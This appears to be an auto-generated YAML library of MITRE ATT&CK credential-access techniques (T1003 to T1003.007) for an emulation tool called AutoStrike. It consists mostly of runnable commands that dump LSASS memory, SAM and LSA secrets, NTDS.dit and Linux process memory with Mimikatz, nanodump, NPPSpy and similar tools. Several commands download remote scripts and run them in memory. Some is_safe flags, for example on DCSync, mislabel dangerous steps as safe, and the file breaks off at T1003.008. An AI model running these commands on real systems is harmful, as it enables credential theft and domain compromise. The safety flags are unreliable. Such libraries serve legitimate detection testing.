# AutoStrike MITRE ATT&CK Techniques - credential-access
# Auto-generated by mitre-import script
# Source: MITRE ATT&CK STIX 2.1 + Atomic Red Team

- id: T1003
  name: OS Credential Dumping
  description: |-
    Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password. Credentials can be obtained from OS caches, memory, or structures.[1](https://labs.portcullis.co.uk/download/eu-18-Wadhwa-Brown-Where-2-worlds-collide-Bringing-Mimikatz-et-al-to-UNIX.pdf) Credentials can then be used to perform [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and access restricted information.

    Several of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.
  tactic: credential-access
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Gsecdump
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\gsecdump.exe" -a'
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Credential Dumping with NPPSpy
      type: powershell
      platform: windows
      command: |-
        Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\NPPSPY.dll" -Destination "C:\Windows\System32"
        $path = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order" -Name PROVIDERORDER
        $UpdatedValue = $Path.PROVIDERORDER + ",NPPSpy"
        Set-ItemProperty -Path $Path.PSPath -Name "PROVIDERORDER" -Value $UpdatedValue
        $rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy -ErrorAction Ignore
        $rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -ErrorAction Ignore
        $rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "Class" -Value 2 -ErrorAction Ignore
        $rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "Name" -Value NPPSpy -ErrorAction Ignore
        $rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "ProviderPath" -PropertyType ExpandString -Value "%SystemRoot%\System32\NPPSPY.dll" -ErrorAction Ignore
        echo "[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\NPPSpy.txt"
      cleanup: "$cleanupPath = Get-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order\" -Name PROVIDERORDER\n$cleanupUpdatedValue = $cleanupPath.PROVIDERORDER \n$cleanupUpdatedValue = $cleanupUpdatedValue -replace ',NPPSpy',''\nSet-ItemProperty -Path $cleanupPath.PSPath -Name \"PROVIDERORDER\" -Value $cleanupUpdatedValue\nRemove-Item -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\" -Recurse -ErrorAction Ignore\nRemove-Item C:\\NPPSpy.txt -ErrorAction Ignore\nRemove-Item C:\\Windows\\System32\\NPPSpy.dll -ErrorAction Ignore"
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Dump svchost.exe to gather RDP credentials
      type: powershell
      platform: windows
      command: |-
        $ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore)
        if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }
        C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $id $env:TEMP\svchost-exe.dmp full
      cleanup: Remove-Item $env:TEMP\svchost-exe.dmp -ErrorAction Ignore
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Retrieve Microsoft IIS Service Account Credentials Using AppCmd (using list)
      type: powershell
      platform: windows
      command: |-
        C:\Windows\System32\inetsrv\appcmd.exe list apppool /@t:*
        C:\Windows\System32\inetsrv\appcmd.exe list apppool /@text:*
        C:\Windows\System32\inetsrv\appcmd.exe list apppool /text:*
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Retrieve Microsoft IIS Service Account Credentials Using AppCmd (using config)
      type: powershell
      platform: windows
      command: C:\Windows\System32\inetsrv\appcmd.exe list apppool /config
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Dump Credential Manager using keymgr.dll and rundll32.exe
      type: powershell
      platform: windows
      command: rundll32.exe keymgr,KRShowKeyMgr
      timeout: 120
      is_safe: true
    - name: Send NTLM Hash with RPC Test Connection
      type: powershell
      platform: windows
      command: rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM 1>$Null
      timeout: 120
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1003
  is_safe: true
- id: T1003.001
  name: LSASS Memory
  description: |-
    Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct [Lateral Movement](https://attack.mitre.org/tactics/TA0008) using [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550).

    As well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.

    For example, on the target host use procdump:

    * <code>procdump -ma lsass.exe lsass_dump</code>

    Locally, mimikatz can be run using:

    * <code>sekurlsa::Minidump lsassdump.dmp</code>
    * <code>sekurlsa::logonPasswords</code>

    Built-in Windows tools such as `comsvcs.dll` can also be used:

    * <code>rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump PID  lsass.dmp full</code>[1](https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/)[2](https://symantec.broadcom.com/hubfs/Attacks-Against-Government-Sector.pdf)

    Similar to [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012), the silent process exit mechanism can be abused to create a memory dump of `lsass.exe` through Windows Error Reporting (`WerFault.exe`).[3](https://www.deepinstinct.com/blog/lsass-memory-dumps-are-stealthier-than-ever-before-part-2)

    Windows Security Support Provider (SSP) DLLs are loaded into LSASS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code> and <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.[4](http://docplayer.net/20839173-Analysis-of-malicious-security-support-provider-dlls.html)

    The following SSPs can be used to access credentials:

    * Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.
    * Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.[5](https://blogs.technet.microsoft.com/askpfeplat/2016/04/18/the-importance-of-kb2871997-and-kb2928120-for-credential-protection/)
    * Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.
    * CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.[5](https://blogs.technet.microsoft.com/askpfeplat/2016/04/18/the-importance-of-kb2871997-and-kb2928120-for-credential-protection/)
  tactic: credential-access
  platforms:
    - windows
  executors:
    - name: Dump LSASS.exe Memory using ProcDump
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\procdump.exe" -accepteula -ma lsass.exe C:\Windows\Temp\lsass_dump.dmp'
      cleanup: del "C:\Windows\Temp\lsass_dump.dmp" >nul 2> nul
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Dump LSASS.exe Memory using comsvcs.dll
      type: powershell
      platform: windows
      command: C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full
      cleanup: Remove-Item $env:TEMP\lsass-comsvcs.dmp -ErrorAction Ignore
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Dump LSASS.exe Memory using direct system calls and API unhooking
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\Outflank-Dumpert.exe"'
      cleanup: del C:\windows\temp\dumpert.dmp >nul 2> nul
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Dump LSASS.exe Memory using NanoDump
      type: cmd
      platform: windows
      command: PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe -w "%temp%\nanodump.dmp"
      cleanup: del "%temp%\nanodump.dmp" >nul 2> nul
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Offline Credential Theft With Mimikatz
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\x64\mimikatz.exe" "sekurlsa::minidump %tmp%\lsass.DMP" "sekurlsa::logonpasswords full" exit'
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: LSASS read with pypykatz
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\venv_t1003_001\Scripts\pypykatz" live lsa'
      cleanup: del "%temp%\nanodump.dmp" > nul 2> nul
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Dump LSASS.exe Memory using Out-Minidump.ps1
      type: powershell
      platform: windows
      command: |-
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
        try{ IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1003.001/src/Out-Minidump.ps1') -ErrorAction Stop}
        catch{ $_; exit $_.Exception.Response.StatusCode.Value__}
        get-process lsass | Out-Minidump
      cleanup: Remove-Item $env:TEMP\lsass_*.dmp -ErrorAction Ignore
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Create Mini Dump of LSASS.exe using ProcDump
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\procdump.exe" -accepteula -mm lsass.exe C:\Windows\Temp\lsass_dump.dmp'
      cleanup: del "C:\Windows\Temp\lsass_dump.dmp" >nul 2> nul
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Powershell Mimikatz
      type: powershell
      platform: windows
      command: IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Dump LSASS with createdump.exe from .Net v5
      type: powershell
      platform: windows
      command: |-
        $exePath =  resolve-path "$env:ProgramFiles\dotnet\shared\Microsoft.NETCore.App\5*\createdump.exe"
        & "$exePath" -u -f $env:Temp\dotnet-lsass.dmp (Get-Process lsass).id
      cleanup: Remove-Item $env:Temp\dotnet-lsass.dmp -ErrorAction Ignore
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Dump LSASS.exe using imported Microsoft DLLs
      type: powershell
      platform: windows
      command: C:\Windows\Temp\xordump.exe -out C:\Windows\Temp\lsass-xordump.t1003.001.dmp -x 0x41
      cleanup: Remove-Item C:\Windows\Temp\lsass-xordump.t1003.001.dmp -ErrorAction Ignore
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Dump LSASS.exe using lolbin rdrleakdiag.exe
      type: powershell
      platform: windows
      command: "if (Test-Path -Path \"$env:SystemRoot\\System32\\rdrleakdiag.exe\") {\n      $binary_path = \"$env:SystemRoot\\System32\\rdrleakdiag.exe\"\n  } elseif (Test-Path -Path \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\") {\n      $binary_path = \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\"\n  } else {\n      $binary_path = \"File not found\"\n      exit 1\n  }\n$lsass_pid = get-process lsass |select -expand id\nif (-not (Test-Path -Path\"$env:TEMP\\t1003.001-13-rdrleakdiag\")) {New-Item -ItemType Directory -Path $env:TEMP\\t1003.001-13-rdrleakdiag -Force} \nwrite-host $binary_path /p $lsass_pid /o $env:TEMP\\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1\n& $binary_path /p $lsass_pid /o $env:TEMP\\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1\nWrite-Host \"Minidump file, minidump_$lsass_pid.dmp can be found inside $env:TEMP\\t1003.001-13-rdrleakdiag directory.\""
      cleanup: Remove-Item $env:TEMP\t1003.001-13-rdrleakdiag -Recurse -Force -ErrorAction Ignore
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Dump LSASS.exe Memory through Silent Process Exit
      type: cmd
      platform: windows
      command: PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe --silent-process-exit "%temp%\SilentProcessExit"
      cleanup: rmdir "%temp%\SilentProcessExit" /s /q >nul 2> nul
      timeout: 120
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1003/001
  is_safe: false
- id: T1003.002
  name: Security Account Manager
  description: "Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with the <code>net user</code> command. Enumerating the SAM database requires SYSTEM level access.\n\nA number of tools can be used to retrieve the SAM file through in-memory techniques:\n\n* pwdumpx.exe\n* [gsecdump](https://attack.mitre.org/software/S0008)\n* [Mimikatz](https://attack.mitre.org/software/S0002)\n* secretsdump.py\n\nAlternatively, the SAM can be extracted from the Registry with Reg:\n\n* <code>reg save HKLM\\sam sam</code>\n* <code>reg save HKLM\\system system</code>\n\nCreddump7 can then be used to process the SAM database locally to retrieve hashes.[1](https://github.com/Neohapsis/creddump7)\n\nNotes: \n\n* RID 500 account is the local, built-in administrator.\n* RID 501 is the guest account.\n* User accounts start with a RID of 1,000+."
  tactic: credential-access
  platforms:
    - windows
  executors:
    - name: Registry dump of SAM, creds, and secrets
      type: cmd
      platform: windows
      command: |-
        reg save HKLM\sam %temp%\sam
        reg save HKLM\system %temp%\system
        reg save HKLM\security %temp%\security
      cleanup: |-
        del %temp%\sam >nul 2> nul
        del %temp%\system >nul 2> nul
        del %temp%\security >nul 2> nul
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Registry parse with pypykatz
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\venv_t1003_002\Scripts\pypykatz" live lsa'
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: esentutl.exe SAM copy
      type: cmd
      platform: windows
      command: esentutl.exe /y /vss %SystemRoot%/system32/config/SAM /d %temp%/SAM
      cleanup: del %temp%\SAM >nul 2>&1
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: PowerDump Hashes and Usernames from Registry
      type: powershell
      platform: windows
      command: |-
        Write-Host "STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON" -fore green
        Import-Module "PathToAtomicsFolder\..\ExternalPayloads\PowerDump.ps1"
        Invoke-PowerDump
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: dump volume shadow copy hives with certutil
      type: cmd
      platform: windows
      command: for /L %a in (1,1,10) do @(certutil -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM" %temp%\SAMvss%a 2 >nul 2>&1) & dir /B %temp%\SAMvss*
      cleanup: for /L %a in (1,1,10) do @(del %temp%\SAMvss%a >nul 2>&1)
      timeout: 120
      is_safe: true
    - name: dump volume shadow copy hives with System.IO.File
      type: powershell
      platform: windows
      command: "1..10 | % { \n try { [System.IO.File]::Copy(\"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy$_\\Windows\\System32\\config\\SAM\" , \"$env:TEMP\\SAMvss$_\", \"true\") } catch {}\n ls \"$env:TEMP\\SAMvss$_\" -ErrorAction Ignore\n}"
      cleanup: |-
        1..10 | % {
          rm "$env:TEMP\SAMvss$_" -ErrorAction Ignore
        }
      timeout: 120
      is_safe: true
    - name: WinPwn - Loot local Credentials - Dump SAM-File for NTLM Hashes
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        samfile -consoleoutput -noninteractive
      timeout: 120
      is_safe: true
    - name: Dumping of SAM, creds, and secrets(Reg Export)
      type: cmd
      platform: windows
      command: |-
        reg export HKLM\sam %temp%\sam
        reg export HKLM\system %temp%\system
        reg export HKLM\security %temp%\security
      cleanup: |-
        del %temp%\sam >nul 2> nul
        del %temp%\system >nul 2> nul
        del %temp%\security >nul 2> nul
      timeout: 120
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1003/002
  is_safe: true
- id: T1003.003
  name: NTDS
  description: |-
    Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. By default, the NTDS file (NTDS.dit) is located in <code>%SystemRoot%\NTDS\Ntds.dit</code> of a domain controller.[1](https://en.wikipedia.org/wiki/Active_Directory)

    In addition to looking for NTDS files on active Domain Controllers, adversaries may search for backups that contain the same or similar information.[2](http://adsecurity.org/?p=1275)

    The following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.

    * Volume Shadow Copy
    * secretsdump.py
    * Using the in-built Windows tool, ntdsutil.exe
    * Invoke-NinjaCopy
  tactic: credential-access
  platforms:
    - windows
  executors:
    - name: Create Volume Shadow Copy with vssadmin
      type: cmd
      platform: windows
      command: 'vssadmin.exe create shadow /for=C:'
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Copy NTDS.dit from Volume Shadow Copy
      type: cmd
      platform: windows
      command: |-
        copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Windows\Temp\ntds.dit
        copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Windows\Temp\VSC_SYSTEM_HIVE
        reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM_HIVE
      cleanup: |-
        del "C:\Windows\Temp\ntds.dit"        >nul 2> nul
        del "C:\Windows\Temp\VSC_SYSTEM_HIVE" >nul 2> nul
        del "C:\Windows\Temp\SYSTEM_HIVE"     >nul 2> nul
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Dump Active Directory Database with NTDSUtil
      type: cmd
      platform: windows
      command: |-
        mkdir C:\Windows\Temp\ntds_T1003
        ntdsutil "ac i ntds" "ifm" "create full C:\Windows\Temp\ntds_T1003" q q
      cleanup: rmdir /q /s C:\Windows\Temp\ntds_T1003 >nul 2>&1
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Create Volume Shadow Copy with WMI
      type: cmd
      platform: windows
      command: wmic shadowcopy call create Volume=C:\
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Create Volume Shadow Copy remotely with WMI
      type: cmd
      platform: windows
      command: wmic /node:"localhost" shadowcopy call create Volume=C:\
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Create Volume Shadow Copy remotely (WMI) with esentutl
      type: cmd
      platform: windows
      command: wmic /node:"localhost" process call create "cmd.exe /c esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d c:\ntds.dit"
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Create Volume Shadow Copy with Powershell
      type: powershell
      platform: windows
      command: (gwmi -list win32_shadowcopy).Create('C:\','ClientAccessible')
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Create Symlink to Volume Shadow Copy
      type: cmd
      platform: windows
      command: |-
        vssadmin.exe create shadow /for=C:
        mklink /D C:\Temp\vssstore \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Create Volume Shadow Copy with diskshadow
      type: cmd
      platform: windows
      command: |-
        mkdir c:\exfil
        diskshadow.exe /s PathToAtomicsFolder\T1003.003\src\diskshadow.txt
      timeout: 120
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1003/003
  is_safe: false
- id: T1003.004
  name: LSA Secrets
  description: |-
    Adversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts.[1](https://www.passcape.com/index.php?section=docsys&cmd=details&id=23)[2](https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material?redirectedfrom=MSDN)[3](https://www.first.org/resources/papers/conf2017/Windows-Credentials-Attacks-and-Mitigation-Techniques.pdf) LSA secrets are stored in the registry at <code>HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets</code>. LSA secrets can also be dumped from memory.[4](https://ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsa-secrets)

    [Reg](https://attack.mitre.org/software/S0075) can be used to extract from the Registry. [Mimikatz](https://attack.mitre.org/software/S0002) can be used to extract secrets from memory.[4](https://ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsa-secrets)
  tactic: credential-access
  platforms:
    - windows
  executors:
    - name: Dumping LSA Secrets
      type: cmd
      platform: windows
      command: '"PathToAtomicsFolder\..\ExternalPayloads\T1003.004\bin\PsExec.exe" -accepteula -s reg save HKLM\security\policy\secrets %temp%\secrets /y'
      cleanup: del %temp%\secrets >nul 2> nul
      timeout: 120
      elevation_required: true
      is_safe: false
    - name: Dump Kerberos Tickets from LSA using dumper.ps1
      type: powershell
      platform: windows
      command: Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MzHmO/PowershellKerberos/beed52acda37fc531ef0cb4df3fc2eb63a74bbb8/dumper.ps1')
      timeout: 120
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1003/004
  is_safe: false
- id: T1003.005
  name: Cached Domain Credentials
  description: "Adversaries may attempt to access cached domain credentials used to allow authentication to occur in the event a domain controller is unavailable.[1](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/hh994565(v%3Dws.11))\n\nOn Windows Vista and newer, the hash format is DCC2 (Domain Cached Credentials version 2) hash, also known as MS-Cache v2 hash.[2](https://passlib.readthedocs.io/en/stable/lib/passlib.hash.msdcc2.html) The number of default cached credentials varies and can be altered per system. This hash does not allow pass-the-hash style attacks, and instead requires [Password Cracking](https://attack.mitre.org/techniques/T1110/002) to recover the plaintext password.[3](https://ired.team/offensive-security/credential-access-and-credential-dumping/dumping-and-cracking-mscash-cached-domain-credentials)\n\nOn Linux systems, Active Directory credentials can be accessed through caches maintained by software like System Security Services Daemon (SSSD) or Quest Authentication Services (formerly VAS). Cached credential hashes are typically located at `/var/lib/sss/db/cache.[domain].ldb` for SSSD or `/var/opt/quest/vas/authcache/vas_auth.vdb` for Quest. Adversaries can use utilities, such as `tdbdump`, on these database files to dump the cached hashes and use [Password Cracking](https://attack.mitre.org/techniques/T1110/002) to obtain the plaintext password.[4](https://labs.portcullis.co.uk/download/eu-18-Wadhwa-Brown-Where-2-worlds-collide-Bringing-Mimikatz-et-al-to-UNIX.pdf) \n\nWith SYSTEM or sudo access, the tools/utilities such as [Mimikatz](https://attack.mitre.org/software/S0002), [Reg](https://attack.mitre.org/software/S0075), and secretsdump.py for Windows or Linikatz for Linux can be used to extract the cached credentials.[4](https://labs.portcullis.co.uk/download/eu-18-Wadhwa-Brown-Where-2-worlds-collide-Bringing-Mimikatz-et-al-to-UNIX.pdf)\n\nNote: Cached credentials for Windows Vista are derived using PBKDF2.[2](https://passlib.readthedocs.io/en/stable/lib/passlib.hash.msdcc2.html)"
  tactic: credential-access
  platforms:
    - windows
    - linux
  executors:
    - name: Cached Credential Dump via Cmdkey
      type: cmd
      platform: windows
      command: cmdkey /list
      timeout: 120
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1003/005
  is_safe: true
- id: T1003.006
  name: DCSync
  description: |-
    Adversaries may attempt to access credentials and other sensitive information by abusing a Windows Domain Controller's application programming interface (API)[1](https://msdn.microsoft.com/library/cc228086.aspx) [2](https://msdn.microsoft.com/library/dd207691.aspx) [3](https://wiki.samba.org/index.php/DRSUAPI) [4](https://strontic.github.io/xcyclopedia/library/samlib.dll-0BDF6351009F6EBA5BA7E886F23263B1.html) to simulate the replication process from a remote domain controller using a technique called DCSync.

    Members of the Administrators, Domain Admins, and Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data[5](https://adsecurity.org/?p=1729) from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) for use in [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003)[6](https://blog.harmj0y.net/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/) or change an account's password as noted in [Account Manipulation](https://attack.mitre.org/techniques/T1098).[7](https://blog.stealthbits.com/manipulating-user-passwords-with-mimikatz-SetNTLM-ChangeNTLM)

    DCSync functionality has been included in the "lsadump" module in [Mimikatz](https://attack.mitre.org/software/S0002).[8](https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump) Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol.[9](https://msdn.microsoft.com/library/cc237008.aspx)
  tactic: credential-access
  platforms:
    - windows
  executors:
    - name: DCSync (Active Directory)
      type: cmd
      platform: windows
      command: '%tmp%\mimikatz\x64\mimikatz.exe "lsadump::dcsync /domain:%userdnsdomain% /user:krbtgt@%userdnsdomain%" "exit"'
      timeout: 120
      is_safe: true
    - name: Run DSInternals Get-ADReplAccount
      type: powershell
      platform: windows
      command: Get-ADReplAccount -All -Server $ENV:logonserver.TrimStart("\")
      timeout: 120
      is_safe: true
  references:
    - https://attack.mitre.org/techniques/T1003/006
  is_safe: true
- id: T1003.007
  name: Proc Filesystem
  description: |-
    Adversaries may gather credentials from the proc filesystem or `/proc`. The proc filesystem is a pseudo-filesystem used as an interface to kernel data structures for Linux based systems managing virtual memory. For each process, the `/proc/<PID>/maps` file shows how memory is mapped within the process’s virtual address space. And `/proc/<PID>/mem`, exposed for debugging purposes, provides access to the process’s virtual address space.[1](https://www.picussecurity.com/resource/the-mitre-attck-t1003-os-credential-dumping-technique-and-its-adversary-use)[2](https://www.baeldung.com/linux/proc-id-maps)

    When executing with root privileges, adversaries can search these memory locations for all processes on a system that contain patterns indicative of credentials. Adversaries may use regex patterns, such as <code>grep -E "^[0-9a-f-]* r" /proc/"$pid"/maps | cut -d' ' -f 1</code>, to look for fixed strings in memory structures or cached hashes.[3](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.007/T1003.007.md) When running without privileged access, processes can still view their own virtual memory locations. Some services or programs may save credentials in clear text inside the process’s memory.[4](https://github.com/huntergregal/mimipenguin)[5](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#proc-usdpid-maps-and-proc-usdpid-mem)

    If running as or with the permissions of a web browser, a process can search the `/maps` & `/mem` locations for common website credential patterns (that can also be used to find adjacent memory within the same structure) in which hashes or cleartext credentials may be located.
  tactic: credential-access
  platforms:
    - linux
  executors:
    - name: Dump individual process memory with sh (Local)
      type: sh
      platform: linux
      command: |-
        sh /tmp/T1003.007.sh
        PID=$(pgrep -n -f "T1003.007")
        HEAP_MEM=$(grep -E "^[0-9a-f-]* r" /proc/"$PID"/maps | grep heap | cut -d' ' -f 1)
        MEM_START=$(echo $((0x$(echo "$HEAP_MEM" | cut -d"-" -f1))))
        MEM_STOP=$(echo $((0x$(echo "$HEAP_MEM" | cut -d"-" -f2))))
        MEM_SIZE=$(echo $((0x$MEM_STOP-0x$MEM_START)))
        dd if=/proc/"${PID}"/mem of="/tmp/T1003.007.bin" ibs=1 skip="$MEM_START" count="$MEM_SIZE"
        grep -i "PASS" "/tmp/T1003.007.bin"
      cleanup: rm -f "/tmp/T1003.007.bin"
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Dump individual process memory with sh on FreeBSD (Local)
      type: sh
      platform: linux
      command: |-
        sh /tmp/T1003.007.sh
        PID=$(pgrep -n -f "T1003.007")
        MEM_START=$(head -n 5 /proc/"${PID}"/map | tail -1 | cut -d' ' -f1)
        MEM_STOP=$(head -n 5 /proc/"${PID}"/map | tail -1 | cut -d' ' -f2)
        MEM_SIZE=$(echo $(($MEM_STOP-$MEM_START)))
        dd if=/proc/"${PID}"/mem of="/tmp/T1003.007.bin" ibs=1 skip="$MEM_START" count="$MEM_SIZE"
        strings "/tmp/T1003.007.bin" | grep -i PASS
      cleanup: rm -f "/tmp/T1003.007.bin"
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Dump individual process memory with Python (Local)
      type: sh
      platform: linux
      command: |-
        sh /tmp/T1003.007.sh
        PID=$(pgrep -n -f "T1003.007")
        PYTHON=$(which python || which python3 || which python2)
        $PYTHON PathToAtomicsFolder/T1003.007/src/dump_heap.py $PID /tmp/T1003.007.bin
        grep -i "PASS" "/tmp/T1003.007.bin"
      cleanup: rm -f "/tmp/T1003.007.bin"
      timeout: 60
      elevation_required: true
      is_safe: false
    - name: Capture Passwords with MimiPenguin
      type: bash
      platform: linux
      command: |-
        sudo /tmp/mimipenguin/mimipenguin_2.0-release/mimipenguin.sh > /tmp/T1003.007Test3.txt
        cat /tmp/T1003.007Test3.txt
      cleanup: rm -f /tmp/T1003.007Test3.txt > /dev/null
      timeout: 60
      elevation_required: true
      is_safe: false
  references:
    - https://attack.mitre.org/techniques/T1003/007
  is_safe: false
- id: T1003.008
  name: /etc/passwd and /etc/shadow
  description: |-
